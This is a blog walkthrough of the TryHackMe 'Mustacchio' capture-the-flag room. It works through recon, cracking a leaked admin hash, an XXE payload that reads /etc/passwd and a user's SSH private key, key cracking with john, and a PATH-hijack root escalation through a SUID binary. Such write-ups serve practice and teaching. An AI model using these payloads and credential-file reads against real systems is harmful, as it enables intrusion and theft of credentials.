---
layout: post
title:  "TryHackMe - Mustacchio"
date:   2021-06-14 10:30:46 +0200
categories: tryhackme
---

Here is the link to the CTF: [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

# Initial recon
I started a scan with `rustscan` and `nmap`.
```bash
rustscan -r 1-65535 -a "TARGETIP" -- -sV -sC -T5 -Pn --script=vuln -oN nmap.log
```
This is a table of the exposed revices:

| Port | Service |
| :--: | :-----: |
| 22 | OpenSSH 7.2p2 Ubuntu |
| 80 | Apache httpd 2.4.18 | 
| 8765 | nginx 1.10.3 | 

# Apache webserver
By checking the source code of `index.html`, we found paths to some `js` and `css` scripts.

![2021-06-12_23-06.png](/assets/43defb6036184e7bab085e0e79eb656d.png)

I therefore checked the `/custom/js/` path and we find out that there's a file called `user.bak`

![37b4374bc68bc00446003932a1720230.png](/assets/00e0beedf5884ebdbd8109af0c1eac38.png)

I downloaded it with `wget` and realized that it was a SQLite database.

For reading it properly, we would need `sqlite3`.

Those are the simples steps that I used to read the file:

 - I opened the file by issuing `sqlit3 users.bak`,
 - Listed the tables names by using `.tables` command
 - Read the content of the whole table with a simple SQL query: 

```sql
 SELECT * FROM users;
```

![0a686ca233e6dcc9bb99a7daf06d871b.png](/assets/748860b49f7142c3a1de94d3e234774f.png)

And indeed, we have some credentials. We just have to crack the hash.

I used [jhf](https://github.com/jackrendor/jhf) to quickly identify the hashed password.
```
jhf "0a686ca233e6dcc9bb99a7daf06d871b"
```
![7bdcbbe932b7024bf30f53c1106049db.png](/assets/ab1abe7e90354a8792eff447c73e1ddb.png)

Now we got the credentials for the user `admin`.

# nginx webserver

Accessing the nginx service, we get access to a login page.
![e40bcb1b7b6fd004978e19c8540785ae.png](/assets/7bd8bf12f4ab4bcd9563a43826363ca3.png)

I immediately used the credentials that I found about the `admin` user and I successfully logged in.

![03d3d76e6321f11c16dbdf51e1be1353.png](/assets/80eaac5e808949ffbe42f7d4b40f5249.png)


I started to analyze the html code and the `Submit` button calls a function called `checktarea`. Therefore I tried to look for references to that funciton and this is what I found:
```js
//document.cookie = "Example=/auth/dontforget.bak"; 
function checktarea() {
	let tbox = document.getElementById("box").value;
	if (tbox == null || tbox.length == 0) {
		alert("Insert XML Code!")
	}
}
```

The alert that displayes `Insert XML Code!` made my think a lot.
All I had to do is just understand what tags is it looking for when I press the submit button.

I blidly typed my name in the text box and clicked `Submit`.
![866a2469ae203a90cb90f1fcbf3f8983.png](/assets/e202a99dcfcd40e889689e312569f94b.png)

3 new information appears right below the submit button.
-  name
-  author
-  comment

I then understood that those 3 are the tags that the webpage is looking for, so what I did next was to craft my payload to confirm that it's vulnerable to `XXE`.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE jack [<!ENTITY rickroll SYSTEM "file:///etc/passwd"> ]>
<jackrendor>
    <name>&rickroll;</name>
</jackrendor>
```

Important note here: 
- `[<!ENTITY rickroll SYSTEM "file:///etc/passwd"> ]` triest to execute the command between the quotation mark and puts the result in the `rickroll` variable.

- `<name>&rickroll;</name>` takes the value of the variable `rickroll` and it "assign" it to the tag "name" that later will be displayed to us.


![b5ae2fa7eb623d49495a476368579b27.png](/assets/fec35fc801af427489bb02302cd5b391.png)

Indeed, it worked.
I was able to successfully read arbitrary files from the server.

Reading the `passwd` file, I noticed that there are some "unusual users". I tried to get the `id_rsa` key of every user until I tried to get `Barry`'s one. And I succeded. The only issue is that it's ecrypted.

![0e3000bc277d1540fb3fe8f2249d210e.png](/assets/e983c233a14b405eb26c97826f348a1b.png)

I saved the content of the file locally as `barry.key` and converted it in order to make `john` able to crack it.

```bash
chmod 600 barry.key
ssh2john.py barry.key > crackme.txt
john -w=/usr/share/wordlists/rockyou.txt crackme.txt
```

![a0f56854b5a2fad4e837bbe684d2ed82.png](/assets/2cfa0937cfec4012aaea7f757f3de01a.png)

Now we just have to confirm the credentials:
```bash
ssh -i barry.key barry@TARGET_IP
```
and insert the password of the cracked key when asked.

# Privilege Escalation

I instanlty check for potential files with SUID on by running the following command:
```bash
find / -type f -perm /4000 2>/dev/null
```
This gave me a list of files that can I can pontentially run as other users.
![303bf3ae8d90d1ac822344bdc0a0d10c.png](/assets/4fd91247f91047c0ae6b6ab2032bf48a.png)

`live_log` looked interesting and I tried to run it by specifying the full path of the binary.

![e82554aca3b779eb7131b2937a59284c.png](/assets/202167d0051b44099268193e64cbac80.png)

This kind of output made me think about some sort of binary that calls a linux command to read the nginx logs. I checked first who was the owner of the file.

![ecd0bd63075811e740c8684538608115.png](/assets/83bba35bb5354d308e0e03a998327fb3.png)

So I can run that executable as root. 

After that, I checked what the file was doing by just filtering for all the printable characters with `strings`.

![68a16d3ecd431e62d9826b286fdf78f9.png](/assets/f4a7fb328e8b4810b566893651634e17.png)

And I was not disappointed at all.

Now, since in the binary is not specifying the full path of the binary, we can abuse about the `PATH` enviorement variable to trick the executable into executing our custom `tail` executable.


I made things easy for me and I just created a script inside `barry`'s home called `tail`, put the following code in it:

```bash
#!/bin/bash
/bin/bash -p
```

> Note: the `-p` flag is needed so we will be able to impersonificate correctly the owner of the vulnerable exetuable. For more information, check [this](https://stackoverflow.com/a/32456814) answer on stackoverflow

make it executable:

```bash
chmod +x tail
```

and exporting the home folder of `barry` as the first path to check when looking for binaries:

```bash
export PATH=$(pwd):$PATH
```


and execute again the binary

```bash
/home/joe/live_log
```

![cf115accf3bc47c2eaa01e08bbabf577.png](/assets/18edd64c218d4cb6bd224b1cd3c49651.png)

And we're root :) 
